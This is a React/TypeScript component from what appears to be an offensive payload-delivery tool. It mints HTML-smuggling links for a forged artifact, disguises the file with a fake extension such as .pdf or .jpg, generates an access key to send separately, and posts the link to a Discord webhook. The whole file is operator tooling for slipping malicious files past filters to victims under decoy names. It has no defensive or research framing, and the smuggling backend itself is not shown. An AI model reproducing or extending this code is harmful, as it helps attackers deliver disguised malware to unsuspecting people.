import { useState } from 'react'
import { SmugResponse, sendDiscordWebhook } from '../api/smuggler'

const DELIVERY_EXTS = ['pdf', 'jpg', 'jpeg', 'png', 'gif', 'svg', 'iso', 'zip']

interface Props {
  artifactName: string
  stageHost:    string
  downloadId:   string | null
  onSmuggle:    (fakeName: string) => Promise<SmugResponse>
}

function genKey(n = 6): string {
  const a = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'
  let s = ''; for (let i = 0; i < n; i++) s += a[Math.floor(Math.random() * a.length)]
  return s
}

export default function DeliveryCard({ artifactName, stageHost, downloadId, onSmuggle }: Props) {
  const settings = loadSettings()
  const [ext, setExt]                   = useState(settings.defaultExt || 'pdf')
  const [smugUrl, setSmugUrl]           = useState<string | null>(null)
  const [smugLoading, setSmugLoading]   = useState(false)
  const [accessKey] = useState(() => genKey(6))
  const [discordStatus, setDiscordStatus] = useState<{ ok?: boolean; msg: string } | null>(null)

  const baseName  = artifactName.replace(/\.[^.]+$/, '')
  const fakeName  = `${baseName}.${ext}`
  const scheme    = typeof window !== 'undefined' ? window.location.protocol.replace(':', '') : 'http'

  async function handleSmuggle() {
    if (!downloadId || smugLoading) return
    setSmugLoading(true)
    try {
      const res = await onSmuggle(fakeName)
      setSmugUrl(`${scheme}://${stageHost}${res.url}`)
    } finally {
      setSmugLoading(false)
    }
  }

  async function handleDiscord() {
    if (!smugUrl) return
    const webhook = settings.discord?.webhook
    if (!settings.discord?.enabled || !webhook) {
      setDiscordStatus({ ok: false, msg: 'Discord not configured' })
      return
    }
    setDiscordStatus({ msg: 'sending…' })
    try {
      await sendDiscordWebhook(webhook, smugUrl, fakeName)
      setDiscordStatus({ ok: true, msg: `sent to ${settings.discord?.channel || 'Discord'}` })
      setTimeout(() => setDiscordStatus(null), 3000)
    } catch {
      setDiscordStatus({ ok: false, msg: 'webhook failed' })
      setTimeout(() => setDiscordStatus(null), 3000)
    }
  }

  return (
    <div className="delivery-card">
      <div className="delivery-head">
        <span className="title">Delivery — HTML smuggler link</span>
        <span className="pill">extension cloak</span>
      </div>
      <div className="delivery-body">
        <div>
          <span className="login-label" style={{ marginBottom: 6, display: 'block' }}>Filename extension</span>
          <div className="ext-picker">
            {DELIVERY_EXTS.map(x => (
              <button key={x}
                className={'ext-chip' + (ext === x ? ' active' : '')}
                onClick={() => setExt(x)}>.{x}</button>
            ))}
          </div>
        </div>
        <div>
          <span className="login-label" style={{ marginBottom: 6, display: 'block' }}>Shareable URL</span>
          <div className="delivery-url-row">
            <span className="delivery-url">
              {smugUrl ?? (downloadId ? `${scheme}://${stageHost}/d/…/${fakeName}` : 'Forge first to mint smuggler link')}
            </span>
            {smugUrl && (
              <button className="btn btn-sm btn-ghost" onClick={() => navigator.clipboard?.writeText(smugUrl)}>
                <svg className="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6">
                  <rect x="8" y="8" width="12" height="12" rx="2"/>
                  <path d="M16 8V5a2 2 0 00-2-2H5a2 2 0 00-2 2v9a2 2 0 002 2h3"/>
                </svg>
                <span>Copy</span>
              </button>
            )}
          </div>
        </div>
        <div>
          <span className="login-label" style={{ marginBottom: 6, display: 'block' }}>Access key (deliver out-of-band)</span>
          <div className="delivery-key-row">
            <span className="delivery-key-val">{accessKey}</span>
            <button className="btn btn-sm btn-ghost" onClick={() => navigator.clipboard?.writeText(accessKey)}>
              <svg className="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6">
                <rect x="8" y="8" width="12" height="12" rx="2"/>
                <path d="M16 8V5a2 2 0 00-2-2H5a2 2 0 00-2 2v9a2 2 0 002 2h3"/>
              </svg>
              <span>Copy</span>
            </button>
          </div>
        </div>
        <div className="delivery-actions">
          {!smugUrl ? (
            <button className="btn btn-sm btn-primary" disabled={!downloadId || smugLoading}
              onClick={handleSmuggle}>
              {smugLoading ? 'Generating…' : 'Mint smuggler link'}
            </button>
          ) : (
            <a className="btn btn-sm btn-primary" href={smugUrl} target="_blank" rel="noopener">Open smuggler page</a>
          )}
          <button className="btn btn-sm" disabled={!smugUrl} onClick={handleDiscord}>Send to Discord</button>
          {discordStatus && (
            <span className={'discord-status' + (discordStatus.ok ? ' sent' : '')}>
              <span className="led"/>{discordStatus.msg}
            </span>
          )}
          {!settings.discord?.enabled && (
            <span className="discord-status">
              <span className="led"/>Discord disabled — enable in Settings
            </span>
          )}
        </div>
      </div>
    </div>
  )
}

interface Settings {
  defaultExt:   string
  stageHost:    string
  smugglerHost: string
  discord:      { enabled: boolean; webhook: string; channel: string }
}
const DEFAULT_SETTINGS: Settings = {
  defaultExt:   'pdf',
  stageHost:    '',
  smugglerHost: '',
  discord:      { enabled: false, webhook: '', channel: '#deliveries' },
}
function loadSettings(): Settings {
  try {
    return { ...DEFAULT_SETTINGS, ...(JSON.parse(localStorage.getItem('dc_settings') || 'null') || {}) }
  } catch {
    return { ...DEFAULT_SETTINGS }
  }
}
